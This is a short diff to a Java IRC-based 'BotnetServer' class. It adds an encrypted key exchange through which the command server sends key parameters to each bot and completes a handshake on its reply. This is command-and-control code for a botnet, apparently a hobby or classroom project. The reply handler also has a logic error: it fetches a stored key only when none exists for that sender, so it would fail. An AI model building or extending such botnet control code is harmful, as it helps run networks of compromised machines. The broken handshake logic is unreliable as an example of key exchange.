@@ -76,6 +76,8 @@ public class BotnetServer extends PircBot {
 	private Scanner input;
 	private boolean inChat;
 	private Map<String, MsgEncrypt> botKeys;
+	
+	private PubInfo info;
 		
 	public static void main(String[] args) {
 		BotnetServer bn = new BotnetServer();
@@ -142,7 +144,12 @@ public class BotnetServer extends PircBot {
 		for (int i = 0; i < bots.length; i++) {
 			System.out.println("\t" + bots[i].toString());
 			//TODO: fill in stuff with key stuff
-			sendMessage(bots[i].getNick(), "stuff");
+			PubInfo info = MsgEncrypt.getPubParams();
+			MsgEncrypt m = MsgEncrypt.getInstance();
+			m.setPubParams(info.toString());
+			String stuff = "key " + m.getStrKey() + " " + info.toString();
+			sendMessage(bots[i].getNick(), stuff);
+			botKeys.put(bots[i].getNick(), m);
 		}
 		init();
 	}
@@ -160,6 +167,9 @@ public class BotnetServer extends PircBot {
 			String[] parts = message.split(" ", 2);
 			if (!botKeys.containsKey(sender) && parts.length > 1) {
 				//botKeys.put(sender, new MsgEncrypt(parts[1]);
+				MsgEncrypt m = botKeys.get(sender);
+				m.handShake(parts[1]);
+				botKeys.put(sender, m);
 			}
 		}
 	}
